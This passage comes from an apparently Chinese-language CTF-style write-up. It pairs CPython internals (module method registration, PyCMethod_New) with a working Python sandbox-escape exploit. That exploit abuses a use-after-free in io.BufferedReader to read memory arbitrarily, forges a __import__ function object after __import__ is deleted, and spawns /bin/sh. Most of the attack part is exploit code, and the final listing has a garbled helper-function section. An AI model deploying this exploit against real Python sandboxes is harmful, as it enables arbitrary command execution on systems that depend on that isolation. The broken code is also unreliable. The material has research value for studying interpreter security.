            }
        }
        ......
    }
    int
    PyModule_AddFunctions(PyObject *m, PyMethodDef *functions)
    {
        int res;
        PyObject *name = PyModule_GetNameObject(m);
        if (name == NULL) {
            return -1;
        }
        res = _add_methods_to_object(m, name, functions);
        Py_DECREF(name);
        return res;
    }
    static int
    _add_methods_to_object(PyObject *module, PyObject *name, PyMethodDef *functions)
    {
        PyObject *func;
        PyMethodDef *fdef;
        for (fdef = functions; fdef->ml_name != NULL; fdef++) {
            if ((fdef->ml_flags & METH_CLASS) ||
                (fdef->ml_flags & METH_STATIC)) {
                PyErr_SetString(PyExc_ValueError,
                                "module functions cannot set"
                                " METH_CLASS or METH_STATIC");
                return -1;
            }
            func = PyCFunction_NewEx(fdef, (PyObject*)module, name);
            if (func == NULL) {
                return -1;
            }
            if (PyObject_SetAttrString(module, fdef->ml_name, func) != 0) {
                Py_DECREF(func);
                return -1;
            }
            Py_DECREF(func);
        }
        return 0;
    }
再看下PyCFunction_NewEx，第二个参数就是`SELF`，赋值给了`m_self`，所以也就解答了`open.__self__`是`_io`模块对象的原因了。
    //Include\methodobject.h
    #define PyCFunction_NewEx(ML, SELF, MOD) PyCMethod_New((ML), (SELF), (MOD), NULL)
    //Objects\methodobject.c
    PyObject *
    PyCMethod_New(PyMethodDef *ml, PyObject *self, PyObject *module, PyTypeObject *cls)
    {
        /* Figure out correct vectorcall function to use */
        vectorcallfunc vectorcall;
        switch (ml->ml_flags & (METH_VARARGS | METH_FASTCALL | METH_NOARGS |
                                METH_O | METH_KEYWORDS | METH_METHOD))
        {
            case METH_VARARGS:
            case METH_VARARGS | METH_KEYWORDS:
                /* For METH_VARARGS functions, it's more efficient to use tp_call
                 * instead of vectorcall. */
                vectorcall = NULL;
                break;
            case METH_FASTCALL:
                vectorcall = cfunction_vectorcall_FASTCALL;
                break;
            case METH_FASTCALL | METH_KEYWORDS:
                vectorcall = cfunction_vectorcall_FASTCALL_KEYWORDS;
                break;
            case METH_NOARGS:
                vectorcall = cfunction_vectorcall_NOARGS;
                break;
            case METH_O:
                vectorcall = cfunction_vectorcall_O;
                break;
            case METH_METHOD | METH_FASTCALL | METH_KEYWORDS:
                vectorcall = cfunction_vectorcall_FASTCALL_KEYWORDS_METHOD;
                break;
            default:
                PyErr_Format(PyExc_SystemError,
                             "%s() method: bad call flags", ml->ml_name);
                return NULL;
        }
        PyCFunctionObject *op = NULL;
        if (ml->ml_flags & METH_METHOD) {
            if (!cls) {
                PyErr_SetString(PyExc_SystemError,
                                "attempting to create PyCMethod with a METH_METHOD "
                                "flag but no class");
                return NULL;
            }
            PyCMethodObject *om = PyObject_GC_New(PyCMethodObject, &PyCMethod_Type);
            if (om == NULL) {
                return NULL;
            }
            Py_INCREF(cls);
            om->mm_class = cls;
            op = (PyCFunctionObject *)om;
        } else {
            if (cls) {
                PyErr_SetString(PyExc_SystemError,
                                "attempting to create PyCFunction with class "
                                "but no METH_METHOD flag");
                return NULL;
            }
            op = PyObject_GC_New(PyCFunctionObject, &PyCFunction_Type);
            if (op == NULL) {
                return NULL;
            }
        }
        op->m_weakreflist = NULL;
        op->m_ml = ml;
        Py_XINCREF(self);
        op->m_self = self;
        Py_XINCREF(module);
        op->m_module = module;
        op->vectorcall = vectorcall;
        _PyObject_GC_TRACK(op);
        return (PyObject *)op;
    }
# 0x05 其他思路：伪造 **import**
在学习彩蛋的过程中想到，python中自带的`__builtins__`也是一个PyModuleObject，而`__import__`则是`__builtins__`模块的方法，因此通过`__builtins__`模块的PyModuleObject->md_def->m_methods去找到`__import__`的方法描述，再伪造一个`__import__`的`PyCFunctionObject`结构体数据，最后利用memoryview指向该伪造数据，通过list对象即可使用`__import__`方法了。
## 5.1 寻找 **import** 的方法描述
按照PyModuleObject->md_def->m_methods，可以遍历PyMethodDef，读取PyMethodDef->ml_name，来判断是不是
**import** 。（PS:p是原exp中的Exploit对象）
    def find_import_def(p):
        data = p.leak(id(__builtins__),0x40)
        md_def = data[0x18:0x20]
        md_def_addr = u64(md_def)
        data = p.leak(md_def_addr,0x48)
        m_methods = data[0x40:0x48]
        m_methods_addr = u64(m_methods)
        PyMethodDef_size = 0x20
        i = 0
        import_PyMethodDef_addr = b""
        while True:
            pyMethodDef = p.leak(m_methods_addr+i*PyMethodDef_size,0x20)
            ml_name = pyMethodDef[0:8]
            ml_name_addr = u64(ml_name)
            if ml_name_addr != 0:
                name = p.leak(ml_name_addr,10)
                if name == b'__import__':
                    import_PyMethodDef_addr = m_methods_addr+i*PyMethodDef_size
                    return import_PyMethodDef_addr
            else:
                break
            i = i+1
        return import_PyMethodDef_addr
## 5.2 伪造 **import** 方法对象
ob_type可以通过内置方法的类型来获取，id、dir、open、len都可以，m_ml则是找到的 **import**
的方法描述地址，m_self根据彩蛋知道就是`__builtins__`模块对象，其他属性赋值为0可以使用。
    def fake_import(cmd):
        p = Exploit()
        import_PyMethodDef_addr = find_import_def(p)
        byte_array_obj = flat(
                p64(10),            # refcount
                p64(id(type(len))), # type obj other func like id、dir、open、len
                p64(import_PyMethodDef_addr),          # PyMethodDef *m_ml             0x10
                p64(id(__builtins__)),          # PyObject    *m_self           0x18
                p64(0x0),          # PyObject    *m_module         0x20
                p64(0x0),          # PyObject    *m_weakreflist    0x28
                p64(0x0),           # vectorcallfunc vectorcall     0x30
            )
        p.freed_buffer[0] = id(byte_array_obj)+32
        os = p.fake_objs[0]("os")
        os.system(cmd)
## 5.3 总结
漏洞可能只能在CTF中Python沙箱了，利用该漏洞可以执行命令，但是条件是open方法没有被删除，但open一般会被作为危险方法删除，所以这漏洞实在是不知道有多好的利用方式，所以就权当好玩把。
附上最终的exp
    io = open.__self__
    def uN(b):
        out = 0
        for i in range(len(b)):
            out |= (b[i] & 0xff)  0:
            s.append(x & 0xff)
            x >>= 8
        return s.ljust(8, b'\0')
    def flat(*args):
        return b''.join(args)
    class File(io._RawIOBase):
        def readinto(self, buf):
            global view
            view = buf
        def readable(self):
            return True
    class Exploit:
        def _create_fake_byte_array(self, addr, size):
            byte_array_obj = flat(
                p64(10),            # refcount
                p64(id(bytearray)), # type obj
                p64(size),          # ob_size
                p64(size),          # ob_alloc
                p64(addr),          # ob_bytes
                p64(addr),          # ob_start
                p64(0x0),           # ob_exports
            )
            self.no_gc.append(byte_array_obj)  # stop gc from freeing after return
            self.freed_buffer[0] = id(byte_array_obj) + 32
        def leak(self, addr, length):
            self._create_fake_byte_array(addr, length)
            return self.fake_objs[0][0:length]
        def __init__(self):
            # Trigger bug
            global view
            f = io.BufferedReader(File())
            f.read(1)
            del f
            view = view.cast('P')
            self.fake_objs = [None] * len(view)
            self.freed_buffer = view
            self.no_gc = []
    def print_hex(data):
        print(hex(data))
    def find_import_def(p):
        data = p.leak(id(__builtins__),0x40)
        md_def = data[0x18:0x20]
        md_def_addr = u64(md_def)
        data = p.leak(md_def_addr,0x48)
        m_methods = data[0x40:0x48]
        m_methods_addr = u64(m_methods)
        PyMethodDef_size = 0x20
        i = 0
        import_PyMethodDef_addr = b""
        while True:
            pyMethodDef = p.leak(m_methods_addr+i*PyMethodDef_size,0x20)
            ml_name = pyMethodDef[0:8]
            ml_name_addr = u64(ml_name)
            if ml_name_addr != 0:
                name = p.leak(ml_name_addr,10)
                if name == b'__import__':
                    import_PyMethodDef_addr = m_methods_addr+i*PyMethodDef_size
                    return import_PyMethodDef_addr
            else:
                break
            i = i+1
        return import_PyMethodDef_addr
    def fake_import(cmd):
        p = Exploit()
        import_PyMethodDef_addr = find_import_def(p)
        byte_array_obj = flat(
                p64(10),            # refcount
                p64(id(type(len))), # type obj other func like id、dir、len
                p64(import_PyMethodDef_addr),          # PyMethodDef *m_ml             0x10
                p64(id(__builtins__)),          # PyObject    *m_self           0x18
                p64(0x0),          # PyObject    *m_module         0x20
                p64(0x0),          # PyObject    *m_weakreflist    0x28
                p64(0x0),           # vectorcallfunc vectorcall     0x30
            )
        p.freed_buffer[0] = id(byte_array_obj)+32
        os = p.fake_objs[0]("os")
        os.system(cmd)
    del __builtins__.__dict__['__import__']   
    fake_import("/bin/sh")